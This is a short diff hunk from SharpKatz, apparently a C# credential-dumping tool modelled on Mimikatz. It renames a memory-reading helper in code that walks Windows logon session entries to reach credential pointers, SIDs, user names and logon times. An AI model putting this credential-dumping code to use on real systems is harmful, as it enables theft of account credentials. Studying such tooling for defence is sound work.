@@ -91,10 +91,10 @@ namespace SharpKatz.Module
                         pCredentials = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialsOffset))),//slistentry.Credentials,
                         pCredentialManager = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialManagerOffset))),
                         pSid = IntPtr.Add(listentry, oshelper.pSidOffset),
-                        LogonTime = Utility.ReadStructFromLocalPtr<FILETIME>(IntPtr.Add(listentry, oshelper.LogonTimeOffset + 4))
+                        LogonTime = Utility.ReadStruct<FILETIME>(IntPtr.Add(listentry, oshelper.LogonTimeOffset + 4))
                     };
 
-                    LUID luid = Utility.ReadStructFromLocalPtr<LUID>(logonsession.LogonId);
+                    LUID luid = Utility.ReadStruct<LUID>(logonsession.LogonId);
 
                     IntPtr pUserName = IntPtr.Add(pList, oshelper.UserNameListOffset);
                     IntPtr pLogonDomain = IntPtr.Add(pList, oshelper.DomaineOffset);
